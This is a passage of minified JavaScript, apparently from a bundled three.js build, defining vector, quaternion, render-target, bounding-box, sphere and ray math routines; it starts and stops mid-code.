this.x*e.x+this.y*e.y+this.z*e.z+this.w*e.w},t.lengthSq=function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},t.length=function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},t.manhattanLength=function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},t.normalize=function(){return this.divideScalar(this.length()||1)},t.setLength=function(e){return this.normalize().multiplyScalar(e)},t.lerp=function(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this.z+=(e.z-this.z)*t,this.w+=(e.w-this.w)*t,this},t.lerpVectors=function(e,t,n){return this.x=e.x+(t.x-e.x)*n,this.y=e.y+(t.y-e.y)*n,this.z=e.z+(t.z-e.z)*n,this.w=e.w+(t.w-e.w)*n,this},t.equals=function(e){return e.x===this.x&&e.y===this.y&&e.z===this.z&&e.w===this.w},t.fromArray=function(e,t){return void 0===t&&(t=0),this.x=e[t],this.y=e[t+1],this.z=e[t+2],this.w=e[t+3],this},t.toArray=function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this.x,e[t+1]=this.y,e[t+2]=this.z,e[t+3]=this.w,e},t.fromBufferAttribute=function(e,t,n){return this.x=e.getX(t),this.y=e.getY(t),this.z=e.getZ(t),this.w=e.getW(t),this},t.random=function(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this.w=Math.random(),this},ee(e,[{key:"width",get:function(){return this.z},set:function(e){this.z=e}},{key:"height",get:function(){return this.w},set:function(e){this.w=e}}]),e}();function ue(e,t,n){this.width=e,this.height=t,this.scissor=new ce(0,0,e,t),this.scissorTest=!1,this.viewport=new ce(0,0,e,t),n=n||{},this.texture=new le(void 0,n.mapping,n.wrapS,n.wrapT,n.magFilter,n.minFilter,n.format,n.type,n.anisotropy,n.encoding),this.texture.image={},this.texture.image.width=e,this.texture.image.height=t,this.texture.generateMipmaps=void 0!==n.generateMipmaps&&n.generateMipmaps,this.texture.minFilter=void 0!==n.minFilter?n.minFilter:f,this.depthBuffer=void 0===n.depthBuffer||n.depthBuffer,this.stencilBuffer=void 0!==n.stencilBuffer&&n.stencilBuffer,this.depthTexture=void 0!==n.depthTexture?n.depthTexture:null}function de(e,t,n){ue.call(this,e,t,n),this.samples=4}ue.prototype=Object.assign(Object.create(K.prototype),{constructor:ue,isWebGLRenderTarget:!0,setSize:function(e,t){this.width===e&&this.height===t||(this.width=e,this.height=t,this.texture.image.width=e,this.texture.image.height=t,this.dispose()),this.viewport.set(0,0,e,t),this.scissor.set(0,0,e,t)},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.width=e.width,this.height=e.height,this.viewport.copy(e.viewport),this.texture=e.texture.clone(),this.depthBuffer=e.depthBuffer,this.stencilBuffer=e.stencilBuffer,this.depthTexture=e.depthTexture,this},dispose:function(){this.dispatchEvent({type:"dispose"})}}),de.prototype=Object.assign(Object.create(ue.prototype),{constructor:de,isWebGLMultisampleRenderTarget:!0,copy:function(e){return ue.prototype.copy.call(this,e),this.samples=e.samples,this}});var pe=function(){function e(e,t,n,r){void 0===e&&(e=0),void 0===t&&(t=0),void 0===n&&(n=0),void 0===r&&(r=1),Object.defineProperty(this,"isQuaternion",{value:!0}),this._x=e,this._y=t,this._z=n,this._w=r}e.slerp=function(e,t,n,r){return n.copy(e).slerp(t,r)},e.slerpFlat=function(e,t,n,r,i,a,o){var s=n[r+0],l=n[r+1],c=n[r+2],u=n[r+3],d=i[a+0],p=i[a+1],h=i[a+2],f=i[a+3];if(u!==f||s!==d||l!==p||c!==h){var A=1-o,m=s*d+l*p+c*h+u*f,v=0<=m?1:-1,g=1-m*m;if(g>Number.EPSILON){var y=Math.sqrt(g),b=Math.atan2(y,m*v);A=Math.sin(A*b)/y,o=Math.sin(o*b)/y}var _=o*v;if(s=s*A+d*_,l=l*A+p*_,c=c*A+h*_,u=u*A+f*_,A===1-o){var w=1/Math.sqrt(s*s+l*l+c*c+u*u);s*=w,l*=w,c*=w,u*=w}}e[t]=s,e[t+1]=l,e[t+2]=c,e[t+3]=u},e.multiplyQuaternionsFlat=function(e,t,n,r,i,a){var o=n[r],s=n[r+1],l=n[r+2],c=n[r+3],u=i[a],d=i[a+1],p=i[a+2],h=i[a+3];return e[t]=o*h+c*u+s*p-l*d,e[t+1]=s*h+c*d+l*u-o*p,e[t+2]=l*h+c*p+o*d-s*u,e[t+3]=c*h-o*u-s*d-l*p,e};var t=e.prototype;return t.set=function(e,t,n,r){return this._x=e,this._y=t,this._z=n,this._w=r,this._onChangeCallback(),this},t.clone=function(){return new this.constructor(this._x,this._y,this._z,this._w)},t.copy=function(e){return this._x=e.x,this._y=e.y,this._z=e.z,this._w=e.w,this._onChangeCallback(),this},t.setFromEuler=function(e,t){if(!e||!e.isEuler)throw new Error("THREE.Quaternion: .setFromEuler() now expects an Euler rotation rather than a Vector3 and order.");var n=e._x,r=e._y,i=e._z,a=e._order,o=Math.cos,s=Math.sin,l=o(n/2),c=o(r/2),u=o(i/2),d=s(n/2),p=s(r/2),h=s(i/2);switch(a){case"XYZ":this._x=d*c*u+l*p*h,this._y=l*p*u-d*c*h,this._z=l*c*h+d*p*u,this._w=l*c*u-d*p*h;break;case"YXZ":this._x=d*c*u+l*p*h,this._y=l*p*u-d*c*h,this._z=l*c*h-d*p*u,this._w=l*c*u+d*p*h;break;case"ZXY":this._x=d*c*u-l*p*h,this._y=l*p*u+d*c*h,this._z=l*c*h+d*p*u,this._w=l*c*u-d*p*h;break;case"ZYX":this._x=d*c*u-l*p*h,this._y=l*p*u+d*c*h,this._z=l*c*h-d*p*u,this._w=l*c*u+d*p*h;break;case"YZX":this._x=d*c*u+l*p*h,this._y=l*p*u+d*c*h,this._z=l*c*h-d*p*u,this._w=l*c*u-d*p*h;break;case"XZY":this._x=d*c*u-l*p*h,this._y=l*p*u-d*c*h,this._z=l*c*h+d*p*u,this._w=l*c*u+d*p*h}return!1!==t&&this._onChangeCallback(),this},t.setFromAxisAngle=function(e,t){var n=t/2,r=Math.sin(n);return this._x=e.x*r,this._y=e.y*r,this._z=e.z*r,this._w=Math.cos(n),this._onChangeCallback(),this},t.setFromRotationMatrix=function(e){var t=e.elements,n=t[0],r=t[4],i=t[8],a=t[1],o=t[5],s=t[9],l=t[2],c=t[6],u=t[10],d=n+o+u;if(0<d){var p=.5/Math.sqrt(d+1);this._w=.25/p,this._x=(c-s)*p,this._y=(i-l)*p,this._z=(a-r)*p}else if(o<n&&u<n){var h=2*Math.sqrt(1+n-o-u);this._w=(c-s)/h,this._x=.25*h,this._y=(r+a)/h,this._z=(i+l)/h}else if(u<o){var f=2*Math.sqrt(1+o-n-u);this._w=(i-l)/f,this._x=(r+a)/f,this._y=.25*f,this._z=(s+c)/f}else{var A=2*Math.sqrt(1+u-n-o);this._w=(a-r)/A,this._x=(i+l)/A,this._y=(s+c)/A,this._z=.25*A}return this._onChangeCallback(),this},t.setFromUnitVectors=function(e,t){var n=e.dot(t)+1;return this._w=(n<1e-6?(n=0,Math.abs(e.x)>Math.abs(e.z)?(this._x=-e.y,this._y=e.x,this._z=0):(this._x=0,this._y=-e.z,this._z=e.y)):(this._x=e.y*t.z-e.z*t.y,this._y=e.z*t.x-e.x*t.z,this._z=e.x*t.y-e.y*t.x),n),this.normalize()},t.angleTo=function(e){return 2*Math.acos(Math.abs(J.clamp(this.dot(e),-1,1)))},t.rotateTowards=function(e,t){var n=this.angleTo(e);if(0===n)return this;var r=Math.min(1,t/n);return this.slerp(e,r),this},t.identity=function(){return this.set(0,0,0,1)},t.inverse=function(){return this.conjugate()},t.conjugate=function(){return this._x*=-1,this._y*=-1,this._z*=-1,this._onChangeCallback(),this},t.dot=function(e){return this._x*e._x+this._y*e._y+this._z*e._z+this._w*e._w},t.lengthSq=function(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w},t.length=function(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)},t.normalize=function(){var e=this.length();return this._w=0===e?(this._x=0,this._y=0,this._z=0,1):(e=1/e,this._x=this._x*e,this._y=this._y*e,this._z=this._z*e,this._w*e),this._onChangeCallback(),this},t.multiply=function(e,t){return void 0!==t?this.multiplyQuaternions(e,t):this.multiplyQuaternions(this,e)},t.premultiply=function(e){return this.multiplyQuaternions(e,this)},t.multiplyQuaternions=function(e,t){var n=e._x,r=e._y,i=e._z,a=e._w,o=t._x,s=t._y,l=t._z,c=t._w;return this._x=n*c+a*o+r*l-i*s,this._y=r*c+a*s+i*o-n*l,this._z=i*c+a*l+n*s-r*o,this._w=a*c-n*o-r*s-i*l,this._onChangeCallback(),this},t.slerp=function(e,t){if(0===t)return this;if(1===t)return this.copy(e);var n=this._x,r=this._y,i=this._z,a=this._w,o=a*e._w+n*e._x+r*e._y+i*e._z;if(o<0?(this._w=-e._w,this._x=-e._x,this._y=-e._y,this._z=-e._z,o=-o):this.copy(e),1<=o)return this._w=a,this._x=n,this._y=r,this._z=i,this;var s=1-o*o;if(s<=Number.EPSILON){var l=1-t;return this._w=l*a+t*this._w,this._x=l*n+t*this._x,this._y=l*r+t*this._y,this._z=l*i+t*this._z,this.normalize(),this._onChangeCallback(),this}var c=Math.sqrt(s),u=Math.atan2(c,o),d=Math.sin((1-t)*u)/c,p=Math.sin(t*u)/c;return this._w=a*d+this._w*p,this._x=n*d+this._x*p,this._y=r*d+this._y*p,this._z=i*d+this._z*p,this._onChangeCallback(),this},t.equals=function(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._w===this._w},t.fromArray=function(e,t){return void 0===t&&(t=0),this._x=e[t],this._y=e[t+1],this._z=e[t+2],this._w=e[t+3],this._onChangeCallback(),this},t.toArray=function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this._x,e[t+1]=this._y,e[t+2]=this._z,e[t+3]=this._w,e},t.fromBufferAttribute=function(e,t){return this._x=e.getX(t),this._y=e.getY(t),this._z=e.getZ(t),this._w=e.getW(t),this},t._onChange=function(e){return this._onChangeCallback=e,this},t._onChangeCallback=function(){},ee(e,[{key:"x",get:function(){return this._x},set:function(e){this._x=e,this._onChangeCallback()}},{key:"y",get:function(){return this._y},set:function(e){this._y=e,this._onChangeCallback()}},{key:"z",get:function(){return this._z},set:function(e){this._z=e,this._onChangeCallback()}},{key:"w",get:function(){return this._w},set:function(e){this._w=e,this._onChangeCallback()}}]),e}(),he=function(){function e(e,t,n){void 0===e&&(e=0),void 0===t&&(t=0),void 0===n&&(n=0),Object.defineProperty(this,"isVector3",{value:!0}),this.x=e,this.y=t,this.z=n}var t=e.prototype;return t.set=function(e,t,n){return void 0===n&&(n=this.z),this.x=e,this.y=t,this.z=n,this},t.setScalar=function(e){return this.x=e,this.y=e,this.z=e,this},t.setX=function(e){return this.x=e,this},t.setY=function(e){return this.y=e,this},t.setZ=function(e){return this.z=e,this},t.setComponent=function(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;case 2:this.z=t;break;default:throw new Error("index is out of range: "+e)}return this},t.getComponent=function(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw new Error("index is out of range: "+e)}},t.clone=function(){return new this.constructor(this.x,this.y,this.z)},t.copy=function(e){return this.x=e.x,this.y=e.y,this.z=e.z,this},t.add=function(e,t){return void 0!==t?this.addVectors(e,t):(this.x+=e.x,this.y+=e.y,this.z+=e.z,this)},t.addScalar=function(e){return this.x+=e,this.y+=e,this.z+=e,this},t.addVectors=function(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this.z=e.z+t.z,this},t.addScaledVector=function(e,t){return this.x+=e.x*t,this.y+=e.y*t,this.z+=e.z*t,this},t.sub=function(e,t){return void 0!==t?this.subVectors(e,t):(this.x-=e.x,this.y-=e.y,this.z-=e.z,this)},t.subScalar=function(e){return this.x-=e,this.y-=e,this.z-=e,this},t.subVectors=function(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this.z=e.z-t.z,this},t.multiply=function(e,t){return void 0!==t?this.multiplyVectors(e,t):(this.x*=e.x,this.y*=e.y,this.z*=e.z,this)},t.multiplyScalar=function(e){return this.x*=e,this.y*=e,this.z*=e,this},t.multiplyVectors=function(e,t){return this.x=e.x*t.x,this.y=e.y*t.y,this.z=e.z*t.z,this},t.applyEuler=function(e){return!e||e.isEuler,this.applyQuaternion(Ae.setFromEuler(e))},t.applyAxisAngle=function(e,t){return this.applyQuaternion(Ae.setFromAxisAngle(e,t))},t.applyMatrix3=function(e){var t=this.x,n=this.y,r=this.z,i=e.elements;return this.x=i[0]*t+i[3]*n+i[6]*r,this.y=i[1]*t+i[4]*n+i[7]*r,this.z=i[2]*t+i[5]*n+i[8]*r,this},t.applyNormalMatrix=function(e){return this.applyMatrix3(e).normalize()},t.applyMatrix4=function(e){var t=this.x,n=this.y,r=this.z,i=e.elements,a=1/(i[3]*t+i[7]*n+i[11]*r+i[15]);return this.x=(i[0]*t+i[4]*n+i[8]*r+i[12])*a,this.y=(i[1]*t+i[5]*n+i[9]*r+i[13])*a,this.z=(i[2]*t+i[6]*n+i[10]*r+i[14])*a,this},t.applyQuaternion=function(e){var t=this.x,n=this.y,r=this.z,i=e.x,a=e.y,o=e.z,s=e.w,l=s*t+a*r-o*n,c=s*n+o*t-i*r,u=s*r+i*n-a*t,d=-i*t-a*n-o*r;return this.x=l*s+d*-i+c*-o-u*-a,this.y=c*s+d*-a+u*-i-l*-o,this.z=u*s+d*-o+l*-a-c*-i,this},t.project=function(e){return this.applyMatrix4(e.matrixWorldInverse).applyMatrix4(e.projectionMatrix)},t.unproject=function(e){return this.applyMatrix4(e.projectionMatrixInverse).applyMatrix4(e.matrixWorld)},t.transformDirection=function(e){var t=this.x,n=this.y,r=this.z,i=e.elements;return this.x=i[0]*t+i[4]*n+i[8]*r,this.y=i[1]*t+i[5]*n+i[9]*r,this.z=i[2]*t+i[6]*n+i[10]*r,this.normalize()},t.divide=function(e){return this.x/=e.x,this.y/=e.y,this.z/=e.z,this},t.divideScalar=function(e){return this.multiplyScalar(1/e)},t.min=function(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this},t.max=function(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this},t.clamp=function(e,t){return this.x=Math.max(e.x,Math.min(t.x,this.x)),this.y=Math.max(e.y,Math.min(t.y,this.y)),this.z=Math.max(e.z,Math.min(t.z,this.z)),this},t.clampScalar=function(e,t){return this.x=Math.max(e,Math.min(t,this.x)),this.y=Math.max(e,Math.min(t,this.y)),this.z=Math.max(e,Math.min(t,this.z)),this},t.clampLength=function(e,t){var n=this.length();return this.divideScalar(n||1).multiplyScalar(Math.max(e,Math.min(t,n)))},t.floor=function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this},t.ceil=function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this},t.round=function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this},t.roundToZero=function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this.z=this.z<0?Math.ceil(this.z):Math.floor(this.z),this},t.negate=function(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this},t.dot=function(e){return this.x*e.x+this.y*e.y+this.z*e.z},t.lengthSq=function(){return this.x*this.x+this.y*this.y+this.z*this.z},t.length=function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},t.manhattanLength=function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},t.normalize=function(){return this.divideScalar(this.length()||1)},t.setLength=function(e){return this.normalize().multiplyScalar(e)},t.lerp=function(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this.z+=(e.z-this.z)*t,this},t.lerpVectors=function(e,t,n){return this.x=e.x+(t.x-e.x)*n,this.y=e.y+(t.y-e.y)*n,this.z=e.z+(t.z-e.z)*n,this},t.cross=function(e,t){return void 0!==t?this.crossVectors(e,t):this.crossVectors(this,e)},t.crossVectors=function(e,t){var n=e.x,r=e.y,i=e.z,a=t.x,o=t.y,s=t.z;return this.x=r*s-i*o,this.y=i*a-n*s,this.z=n*o-r*a,this},t.projectOnVector=function(e){var t=e.lengthSq();if(0===t)return this.set(0,0,0);var n=e.dot(this)/t;return this.copy(e).multiplyScalar(n)},t.projectOnPlane=function(e){return fe.copy(this).projectOnVector(e),this.sub(fe)},t.reflect=function(e){return this.sub(fe.copy(e).multiplyScalar(2*this.dot(e)))},t.angleTo=function(e){var t=Math.sqrt(this.lengthSq()*e.lengthSq());if(0===t)return Math.PI/2;var n=this.dot(e)/t;return Math.acos(J.clamp(n,-1,1))},t.distanceTo=function(e){return Math.sqrt(this.distanceToSquared(e))},t.distanceToSquared=function(e){var t=this.x-e.x,n=this.y-e.y,r=this.z-e.z;return t*t+n*n+r*r},t.manhattanDistanceTo=function(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)+Math.abs(this.z-e.z)},t.setFromSpherical=function(e){return this.setFromSphericalCoords(e.radius,e.phi,e.theta)},t.setFromSphericalCoords=function(e,t,n){var r=Math.sin(t)*e;return this.x=r*Math.sin(n),this.y=Math.cos(t)*e,this.z=r*Math.cos(n),this},t.setFromCylindrical=function(e){return this.setFromCylindricalCoords(e.radius,e.theta,e.y)},t.setFromCylindricalCoords=function(e,t,n){return this.x=e*Math.sin(t),this.y=n,this.z=e*Math.cos(t),this},t.setFromMatrixPosition=function(e){var t=e.elements;return this.x=t[12],this.y=t[13],this.z=t[14],this},t.setFromMatrixScale=function(e){var t=this.setFromMatrixColumn(e,0).length(),n=this.setFromMatrixColumn(e,1).length(),r=this.setFromMatrixColumn(e,2).length();return this.x=t,this.y=n,this.z=r,this},t.setFromMatrixColumn=function(e,t){return this.fromArray(e.elements,4*t)},t.setFromMatrix3Column=function(e,t){return this.fromArray(e.elements,3*t)},t.equals=function(e){return e.x===this.x&&e.y===this.y&&e.z===this.z},t.fromArray=function(e,t){return void 0===t&&(t=0),this.x=e[t],this.y=e[t+1],this.z=e[t+2],this},t.toArray=function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this.x,e[t+1]=this.y,e[t+2]=this.z,e},t.fromBufferAttribute=function(e,t,n){return this.x=e.getX(t),this.y=e.getY(t),this.z=e.getZ(t),this},t.random=function(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this},e}(),fe=new he,Ae=new pe,me=function(){function e(e,t){Object.defineProperty(this,"isBox3",{value:!0}),this.min=void 0!==e?e:new he(1/0,1/0,1/0),this.max=void 0!==t?t:new he(-1/0,-1/0,-1/0)}var t=e.prototype;return t.set=function(e,t){return this.min.copy(e),this.max.copy(t),this},t.setFromArray=function(e){for(var t=1/0,n=1/0,r=1/0,i=-1/0,a=-1/0,o=-1/0,s=0,l=e.length;s<l;s+=3){var c=e[s],u=e[s+1],d=e[s+2];c<t&&(t=c),u<n&&(n=u),d<r&&(r=d),i<c&&(i=c),a<u&&(a=u),o<d&&(o=d)}return this.min.set(t,n,r),this.max.set(i,a,o),this},t.setFromBufferAttribute=function(e){for(var t=1/0,n=1/0,r=1/0,i=-1/0,a=-1/0,o=-1/0,s=0,l=e.count;s<l;s++){var c=e.getX(s),u=e.getY(s),d=e.getZ(s);c<t&&(t=c),u<n&&(n=u),d<r&&(r=d),i<c&&(i=c),a<u&&(a=u),o<d&&(o=d)}return this.min.set(t,n,r),this.max.set(i,a,o),this},t.setFromPoints=function(e){this.makeEmpty();for(var t=0,n=e.length;t<n;t++)this.expandByPoint(e[t]);return this},t.setFromCenterAndSize=function(e,t){var n=ye.copy(t).multiplyScalar(.5);return this.min.copy(e).sub(n),this.max.copy(e).add(n),this},t.setFromObject=function(e){return this.makeEmpty(),this.expandByObject(e)},t.clone=function(){return(new this.constructor).copy(this)},t.copy=function(e){return this.min.copy(e.min),this.max.copy(e.max),this},t.makeEmpty=function(){return this.min.x=this.min.y=this.min.z=1/0,this.max.x=this.max.y=this.max.z=-1/0,this},t.isEmpty=function(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z},t.getCenter=function(e){return void 0===e&&(e=new he),this.isEmpty()?e.set(0,0,0):e.addVectors(this.min,this.max).multiplyScalar(.5)},t.getSize=function(e){return void 0===e&&(e=new he),this.isEmpty()?e.set(0,0,0):e.subVectors(this.max,this.min)},t.expandByPoint=function(e){return this.min.min(e),this.max.max(e),this},t.expandByVector=function(e){return this.min.sub(e),this.max.add(e),this},t.expandByScalar=function(e){return this.min.addScalar(-e),this.max.addScalar(e),this},t.expandByObject=function(e){e.updateWorldMatrix(!1,!1);var t=e.geometry;void 0!==t&&(null===t.boundingBox&&t.computeBoundingBox(),be.copy(t.boundingBox),be.applyMatrix4(e.matrixWorld),this.union(be));for(var n=e.children,r=0,i=n.length;r<i;r++)this.expandByObject(n[r]);return this},t.containsPoint=function(e){return!(e.x<this.min.x||e.x>this.max.x||e.y<this.min.y||e.y>this.max.y||e.z<this.min.z||e.z>this.max.z)},t.containsBox=function(e){return this.min.x<=e.min.x&&e.max.x<=this.max.x&&this.min.y<=e.min.y&&e.max.y<=this.max.y&&this.min.z<=e.min.z&&e.max.z<=this.max.z},t.getParameter=function(e,t){return void 0===t&&(t=new he),t.set((e.x-this.min.x)/(this.max.x-this.min.x),(e.y-this.min.y)/(this.max.y-this.min.y),(e.z-this.min.z)/(this.max.z-this.min.z))},t.intersectsBox=function(e){return!(e.max.x<this.min.x||e.min.x>this.max.x||e.max.y<this.min.y||e.min.y>this.max.y||e.max.z<this.min.z||e.min.z>this.max.z)},t.intersectsSphere=function(e){return this.clampPoint(e.center,ye),ye.distanceToSquared(e.center)<=e.radius*e.radius},t.intersectsPlane=function(e){var t,n;return n=0<e.normal.x?(t=e.normal.x*this.min.x,e.normal.x*this.max.x):(t=e.normal.x*this.max.x,e.normal.x*this.min.x),0<e.normal.y?(t+=e.normal.y*this.min.y,n+=e.normal.y*this.max.y):(t+=e.normal.y*this.max.y,n+=e.normal.y*this.min.y),0<e.normal.z?(t+=e.normal.z*this.min.z,n+=e.normal.z*this.max.z):(t+=e.normal.z*this.max.z,n+=e.normal.z*this.min.z),t<=-e.constant&&n>=-e.constant},t.intersectsTriangle=function(e){if(this.isEmpty())return!1;this.getCenter(Me),Be.subVectors(this.max,Me),_e.subVectors(e.a,Me),we.subVectors(e.b,Me),Ce.subVectors(e.c,Me),xe.subVectors(we,_e),Se.subVectors(Ce,we),ke.subVectors(_e,Ce);var t=[0,-xe.z,xe.y,0,-Se.z,Se.y,0,-ke.z,ke.y,xe.z,0,-xe.x,Se.z,0,-Se.x,ke.z,0,-ke.x,-xe.y,xe.x,0,-Se.y,Se.x,0,-ke.y,ke.x,0];return!!ve(t,_e,we,Ce,Be)&&!!ve(t=[1,0,0,0,1,0,0,0,1],_e,we,Ce,Be)&&(Ee.crossVectors(xe,Se),ve(t=[Ee.x,Ee.y,Ee.z],_e,we,Ce,Be))},t.clampPoint=function(e,t){return void 0===t&&(t=new he),t.copy(e).clamp(this.min,this.max)},t.distanceToPoint=function(e){return ye.copy(e).clamp(this.min,this.max).sub(e).length()},t.getBoundingSphere=function(e){return this.getCenter(e.center),e.radius=.5*this.getSize(ye).length(),e},t.intersect=function(e){return this.min.max(e.min),this.max.min(e.max),this.isEmpty()&&this.makeEmpty(),this},t.union=function(e){return this.min.min(e.min),this.max.max(e.max),this},t.applyMatrix4=function(e){return this.isEmpty()||(ge[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(e),ge[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(e),ge[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(e),ge[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(e),ge[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(e),ge[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(e),ge[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(e),ge[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(e),this.setFromPoints(ge)),this},t.translate=function(e){return this.min.add(e),this.max.add(e),this},t.equals=function(e){return e.min.equals(this.min)&&e.max.equals(this.max)},e}();function ve(e,t,n,r,i){for(var a=0,o=e.length-3;a<=o;a+=3){Te.fromArray(e,a);var s=i.x*Math.abs(Te.x)+i.y*Math.abs(Te.y)+i.z*Math.abs(Te.z),l=t.dot(Te),c=n.dot(Te),u=r.dot(Te);if(Math.max(-Math.max(l,c,u),Math.min(l,c,u))>s)return!1}return!0}var ge=[new he,new he,new he,new he,new he,new he,new he,new he],ye=new he,be=new me,_e=new he,we=new he,Ce=new he,xe=new he,Se=new he,ke=new he,Me=new he,Be=new he,Ee=new he,Te=new he,Pe=new me,Ie=function(){function e(e,t){this.center=void 0!==e?e:new he,this.radius=void 0!==t?t:-1}var t=e.prototype;return t.set=function(e,t){return this.center.copy(e),this.radius=t,this},t.setFromPoints=function(e,t){var n=this.center;void 0!==t?n.copy(t):Pe.setFromPoints(e).getCenter(n);for(var r=0,i=0,a=e.length;i<a;i++)r=Math.max(r,n.distanceToSquared(e[i]));return this.radius=Math.sqrt(r),this},t.clone=function(){return(new this.constructor).copy(this)},t.copy=function(e){return this.center.copy(e.center),this.radius=e.radius,this},t.isEmpty=function(){return this.radius<0},t.makeEmpty=function(){return this.center.set(0,0,0),this.radius=-1,this},t.containsPoint=function(e){return e.distanceToSquared(this.center)<=this.radius*this.radius},t.distanceToPoint=function(e){return e.distanceTo(this.center)-this.radius},t.intersectsSphere=function(e){var t=this.radius+e.radius;return e.center.distanceToSquared(this.center)<=t*t},t.intersectsBox=function(e){return e.intersectsSphere(this)},t.intersectsPlane=function(e){return Math.abs(e.distanceToPoint(this.center))<=this.radius},t.clampPoint=function(e,t){var n=this.center.distanceToSquared(e);return void 0===t&&(t=new he),t.copy(e),n>this.radius*this.radius&&(t.sub(this.center).normalize(),t.multiplyScalar(this.radius).add(this.center)),t},t.getBoundingBox=function(e){return void 0===e&&(e=new me),this.isEmpty()?e.makeEmpty():(e.set(this.center,this.center),e.expandByScalar(this.radius)),e},t.applyMatrix4=function(e){return this.center.applyMatrix4(e),this.radius=this.radius*e.getMaxScaleOnAxis(),this},t.translate=function(e){return this.center.add(e),this},t.equals=function(e){return e.center.equals(this.center)&&e.radius===this.radius},e}(),Fe=new he,Le=new he,Oe=new he,Ne=new he,De=new he,Re=new he,je=new he,Ue=function(){function e(e,t){this.origin=void 0!==e?e:new he,this.direction=void 0!==t?t:new he(0,0,-1)}var t=e.prototype;return t.set=function(e,t){return this.origin.copy(e),this.direction.copy(t),this},t.clone=function(){return(new this.constructor).copy(this)},t.copy=function(e){return this.origin.copy(e.origin),this.direction.copy(e.direction),this},t.at=function(e,t){return void 0===t&&(t=new he),t.copy(this.direction).multiplyScalar(e).add(this.origin)},t.lookAt=function(e){return this.direction.copy(e).sub(this.origin).normalize(),this},t.recast=function(e){return this.origin.copy(this.at(e,Fe)),this},t.closestPointToPoint=function(e,t){void 0===t&&(t=new he),t.subVectors(e,this.origin);var n=t.dot(this.direction);return n<0?t.copy(this.origin):t.copy(this.direction).multiplyScalar(n).add(this.origin)},t.distanceToPoint=function(e){return Math.sqrt(this.distanceSqToPoint(e))},t.distanceSqToPoint=function(e){var t=Fe.subVectors(e,this.origin).dot(this.direction);return t<0?this.origin.distanceToSquared(e):(Fe.copy(this.direction).multiplyScalar(t).add(this.origin),Fe.distanceToSquared(e))},t.distanceSqToSegment=function(e,t,n,r){Le.copy(e).add(t).multiplyScalar(.5),Oe.copy(t).sub(e).normalize(),Ne.copy(this.origin).sub(Le);var i,a,o,s,l=.5*e.distanceTo(t),c=-this.direction.dot(Oe),u=Ne.dot(this.direction),d=-Ne.dot(Oe),p=Ne.lengthSq(),h=Math.abs(1-c*c);if(0<h)if(a=c*u-d,s=l*h,0<=(i=c*d-u))if(-s<=a)if(a<=s){var f=1/h;o=(i*=f)*(i+c*(a*=f)+2*u)+a*(c*i+a+2*d)+p}else a=l,o=-(i=Math.max(0,-(c*a+u)))*i+a*(a+2*d)+p;else a=-l,o=-(i=Math.max(0,-(c*a+u)))*i+a*(a+2*d)+p;else o=a<=-s?-(i=Math.max(0,-(-c*l+u)))*i+(a=0<i?-l:Math.min(Math.max(-l,-d),l))*(a+2*d)+p:a<=s?(i=0,(a=Math.min(Math.max(-l,-d),l))*(a+2*d)+p):-(i=Math.max(0,-(c*l+u)))*i+(a=0<i?l:Math.min(Math.max(-l,-d),l))*(a+2*d)+p;else a=0<c?-l:l,o=-(i=Math.max(0,-(c*a+u)))*i+a*(a+2*d)+p;return n&&n.copy(this.direction).multiplyScalar(i).add(this.origin),r&&r.copy(Oe).multiplyScalar(a).add(Le),o},t.intersectSphere=function(e,t){Fe.subVectors(e.center,this.origin);var n=Fe.dot(this.direction),r=Fe.dot(Fe)-n*n,i=e.radius*e.radius;if(i<r)return null;var a=Math.sqrt(i-r),o=n-a,s=n+a;return o<0&&s<0?null:o<0?this.at(s,t):this.at(o,t)},t.intersectsSphere=function(e){return this.distanceSqToPoint(e.center)<=e.radius*e.radius},t.distanceToPlane=function(e){var t=e.normal.dot(this.direction);if(0===t)return 0===e.distanceToPoint(this.origin)?0:null;var n=-(this.origin.dot(e.normal)+e.constant)/t;return 0<=n?n:null},t.intersectPlane=function(e,t){var n=this.distanceToPlane(e);return null===n?null:this.at(n,t)},t.intersectsPlane=function(e){var t=e.distanceToPoint(this.origin);return 